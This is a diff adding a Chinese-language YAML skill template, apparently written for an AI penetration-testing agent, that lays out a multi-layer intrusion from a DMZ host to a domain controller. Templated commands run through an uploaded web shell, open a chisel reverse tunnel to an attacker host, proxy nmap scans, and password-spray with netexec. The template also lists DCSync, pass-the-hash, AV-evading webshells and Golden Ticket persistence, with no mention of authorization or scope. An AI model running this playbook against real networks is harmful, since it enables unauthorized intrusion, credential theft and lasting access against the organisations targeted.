@@ -1,0 +1,114 @@
+id: multi-layer-network
+name: 多层网络渗透方法论
+description: DMZ→内网→域控的多层网络渗透路径，含代理搭建和流量转发
+category: 横向移动
+tags: [pivot, proxy, tunnel, multi-layer, lateral]
+difficulty: hard
+icon: "🌐"
+step_count: 8
+variables:
+  - name: dmz_target
+    label: DMZ 目标
+    placeholder: 10.10.10.1
+    required: true
+  - name: internal_range
+    label: 内网网段
+    placeholder: 192.168.1.0/24
+    required: false
+prompt: |
+  # 多层网络渗透方法论
+
+  ## Phase 1: 外层边界突破
+  ```
+  # 端口扫描 DMZ 目标
+  scan_port target="{{dmz_target}}"
+  scan_finger target="{{dmz_target}}"
+  
+  # Web 应用攻击
+  poc_web target="{{dmz_target}}"
+  brute_dir target="{{dmz_target}}"
+  ```
+
+  ## Phase 2: 立足点建立
+  获取 shell 后，收集主机信息:
+  ```
+  shell_execute command="curl http://{{dmz_target}}/shell.php?cmd=ifconfig"
+  shell_execute command="curl http://{{dmz_target}}/shell.php?cmd=cat+/etc/hosts"
+  shell_execute command="curl http://{{dmz_target}}/shell.php?cmd=arp+-a"
+  shell_execute command="curl http://{{dmz_target}}/shell.php?cmd=netstat+-antlp"
+  ```
+  关键信息: 内网IP、路由表、ARP表、hosts文件
+
+  ## Phase 3: 代理搭建
+  **方案 1: 正向代理 (目标可出网)**
+  ```
+  # 上传 frpc 到目标
+  # frpc.ini 配置 → 连接攻击者的 frps
+  ```
+
+  **方案 2: 反向代理 (目标不出网)**
+  ```
+  # chisel server (攻击端): chisel server --reverse --port 8080
+  # chisel client (目标端): chisel client attacker:8080 R:socks
+  ```
+
+  **方案 3: SSH 隧道**
+  ```
+  # 动态端口转发 (SOCKS)
+  ssh -D 1080 user@{{dmz_target}}
+  # 本地端口转发 (特定端口)
+  ssh -L 3389:internal_ip:3389 user@{{dmz_target}}
+  ```
+
+  ## Phase 4: 内网信息收集
+  通过代理对内网进行扫描:
+  ```
+  # 存活探测
+  shell_execute command="nmap -sn {{internal_range}} --proxy socks5://127.0.0.1:1080"
+  
+  # 端口扫描（聚焦关键端口）
+  shell_execute command="nmap -sT -p 22,80,135,139,445,1433,3306,3389,8080 {{internal_range}} --proxy socks5://127.0.0.1:1080"
+  
+  # 快速内网扫描（fscan）
+  shell_execute command="fscan -h {{internal_range}}"
+  ```
+
+  ## Phase 5: 内网横向移动
+  ```
+  # SMB 枚举
+  shell_execute command="netexec smb {{internal_range}} -u user -p pass"
+  
+  # 密码喷洒
+  shell_execute command="netexec smb {{internal_range}} -u users.txt -p 'password'"
+  
+  # 检测域环境
+  shell_execute command="netexec smb {{internal_range}} --gen-relay-list relay.txt"
+  ```
+
+  ## Phase 6: 域环境渗透
+  如发现域环境，参考 Skills: `ad-domain-attack`
+  关键步骤:
+  1. 确认域控位置
+  2. Kerberoasting / AS-REP Roasting
+  3. 凭据转储 + PTH
+  4. DCSync 获取所有哈希
+
+  ## Phase 7: 权限维持
+  - Web层: Webshell (带免杀), 定时任务下载
+  - 系统层: SSH 公钥、计划任务、服务
+  - 域层: Golden Ticket, AdminSDHolder
+
+  ## Phase 8: 攻击路径记录
+  必须记录完整的攻击路径图:
+  ```
+  外网 → DMZ Web服务(漏洞X) → 获取Shell 
+    → 搭建隧道 → 内网扫描
+    → 内网主机A(弱密码) → 横向移动
+    → 域用户凭据 → 域控(DCSync) → 所有凭据
+  ```
+
+  ## 代理工具优先级
+  1. frp/chisel (最稳定)
+  2. SSH 隧道 (最简单)
+  3. reGeorg/Neo-reGeorg (HTTP隧道, 过防火墙)
+  4. ligolo-ng (高性能)
